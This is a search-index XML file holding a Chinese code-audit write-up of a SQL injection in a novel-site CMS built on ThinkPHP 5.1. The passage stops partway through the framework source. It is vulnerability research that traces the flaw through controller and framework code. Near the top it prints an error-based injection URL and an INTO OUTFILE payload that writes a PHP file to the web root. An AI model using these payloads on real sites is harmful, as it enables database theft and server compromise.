<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP代码审计—某雨小说CMS注入到Getshell</title>
      <link href="posts/39006.html"/>
      <url>posts/39006.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>论坛有位老哥发了某个基于TP5框架开发的一个小说网站的注入漏洞，</p><p>拿到源码分析一下</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>CMS版本：1.4.2</p><p>官网地址：</p><p><a href="http://bbs.kyxscms.com/">狂雨小说cms - 狂雨小说cms - Powered by HYBBS (kyxscms.com)</a></p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><p>报错:</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">http://127.0.0.1/?s=api/news/category&amp;cid=updatexml(1,concat(0x7e,user(),0x7e),1)%20--+-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>getshell:</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">// 需要有导出文件权限并且知道绝对路径http://127.0.0.1/?s=api/news/category&amp;cid='<span class="token prolog">&lt;?php phpinfo()?&gt;</span>' into outfile '/var/wzww/html/test.php'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该cms基于ThinkPHP V5.1.33 LTS开发</p><p>漏洞触发点在 <code>\application\api\controller\News.php</code></p><p>category方法获取了三个参数，三个参数可控，重点关注<code>$cid</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">category</span><span class="token punctuation">(</span><span class="token variable">$cid</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$filter</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$category</span><span class="token operator">=</span><span class="token function">model</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'api/api'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">category</span><span class="token punctuation">(</span><span class="token variable">$cid</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=&gt;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token operator">=&gt;</span><span class="token variable">$category</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>跟进 <code>category($cid,$type,$filter)</code> 方法</p><p>这里主要关注<code>get_nav</code>方法的第五个参数，<code>Request::param('cid')</code>,获取了我们传入的<code>$cid</code>参数,</p><p><code>get_nav</code> 第一个参数和第五个参数是一样的，但是只有第五个参数能造成注入</p><p><code>get_nav</code>函数形参只有五个，但是这里传入了六个参数，这里不会报错，多余的参数不做处理</p><p>感觉这里像是故意留的后门。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">category</span><span class="token punctuation">(</span><span class="token variable">$cid</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$api</span><span class="token operator">=</span><span class="token function">model</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'common/api'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$api</span><span class="token operator">-&gt;</span><span class="token property">api_url</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token variable">$category</span><span class="token operator">=</span><span class="token variable">$api</span><span class="token operator">-&gt;</span><span class="token function">get_nav</span><span class="token punctuation">(</span><span class="token variable">$cid</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">,</span><span class="token class-name static-context">Request</span><span class="token operator">::</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cid'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'id,title,pid,icon,type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$category</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$class</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'branch'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$class</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'subor'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">category</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$class</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>get_nav($cid,$type,$filter,false,Request::param('cid'),'id,title,pid,icon,type')</code>方法</p><p>这里的 <code>$category</code> 和 <code>$field</code> 值是一样的，都是我们传入的 <code>cid</code> 的值, 这里也没进行任何过滤操作，</p><p>where() 函数 采用了pdo预处理，而field()函数并没有，所以造成了注入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_nav</span><span class="token punctuation">(</span><span class="token variable">$category</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$cid</span><span class="token punctuation">,</span><span class="token variable">$field</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$map</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span> <span class="token operator">=&gt;</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pid'</span> <span class="token operator">=&gt;</span> <span class="token variable">$category</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$map</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$type</span><span class="token punctuation">;</span><span class="token punctuation">}</span>       <span class="token variable">$data</span><span class="token operator">=</span><span class="token class-name static-context">Db</span><span class="token operator">::</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">field</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">limit</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">order</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token operator">...</span><span class="token operator">...</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进<code>field($field)</code>方法，这里处理的是 知道查询的字段，并没有进行结构化处理，</p><p>如果<code>$field</code>为字符串，并且有<code>[</code>、<code>]</code>、<code>&lt;</code>、<code>'</code>、<code>"</code>、<code>(</code> 字符时，</p><p>调用fieldRaw()方法，将其变成一个查询表达式，并返回，并未进行过滤处理</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * 指定查询字段 支持字段排除和指定数据表 * @access public * @param  mixed   $field * @param  boolean $except    是否排除 * @param  string  $tableName 数据表名 * @param  string  $prefix    字段前缀 * @param  string  $alias     别名前缀 * @return $this */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">field</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$tableName</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$prefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$alias</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$field</span> <span class="token keyword">instanceof</span> <span class="token class-name">Expression</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$field</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\&lt;\'\"\(]/'</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">fieldRaw</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'trim'</span><span class="token punctuation">,</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$field</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 获取全部字段</span>        <span class="token variable">$fields</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getTableFields</span><span class="token punctuation">(</span><span class="token variable">$tableName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$field</span>  <span class="token operator">=</span> <span class="token variable">$fields</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'*'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$except</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 字段排除</span>        <span class="token variable">$fields</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getTableFields</span><span class="token punctuation">(</span><span class="token variable">$tableName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$field</span>  <span class="token operator">=</span> <span class="token variable">$fields</span> <span class="token operator">?</span> <span class="token function">array_diff</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$field</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tableName</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 添加统一的前缀</span>        <span class="token variable">$prefix</span> <span class="token operator">=</span> <span class="token variable">$prefix</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token variable">$tableName</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$field</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token operator">&amp;</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$alias</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$field</span><span class="token punctuation">[</span><span class="token variable">$prefix</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$val</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$alias</span> <span class="token operator">.</span> <span class="token variable">$val</span><span class="token punctuation">;</span>                <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token variable">$prefix</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$val</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$field</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'field'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接跟进 select() 方法，<code>\thinkphp\library\think\db\Connection.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**  * 查找记录  * @access public  * @param Query $query 查询对象  * @return array|\PDOStatement|string  * @throws DbException  * @throws ModelNotFoundException  * @throws DataNotFoundException  */</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Query</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment">// 分析查询表达式</span>     <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token variable">$query</span><span class="token operator">-&gt;</span><span class="token function">getOptions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$resultSet</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getCacheData</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cache'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token variable">$resultSet</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token variable">$resultSet</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token comment">// 生成查询SQL</span>     <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">builder</span><span class="token operator">-&gt;</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">...</span><span class="token operator">...</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进生成查询sql <code>$this-&gt;builder-&gt;select()</code> 方法</p><p><code>\thinkphp\library\think\db\Builder.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Query</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token variable">$query</span><span class="token operator">-&gt;</span><span class="token function">getOptions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span><span class="token string single-quoted-string">'%TABLE%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%DISTINCT%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%FIELD%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%JOIN%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%WHERE%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%GROUP%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%HAVING%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%ORDER%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%LIMIT%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%UNION%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%LOCK%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%COMMENT%'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'%FORCE%'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseDistinct</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'distinct'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseField</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'field'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseGroup</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'group'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseHaving</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'having'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseUnion</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseLock</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lock'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseForce</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'force'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">selectSql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进 <code>parseField()</code>方法, 并未对<code>$fields</code> 参数进行任何过滤，也没进行参数绑定结构化查询处理,</p><p>直接替换在了 select 语句后面  所以造成了注入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseField</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Query</span> <span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$fields</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'*'</span> <span class="token operator">==</span> <span class="token variable">$fields</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$fieldsStr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 支持 'field1'=&gt;'field2' 这样的字段别名定义</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$fields</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$field</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' AS '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token 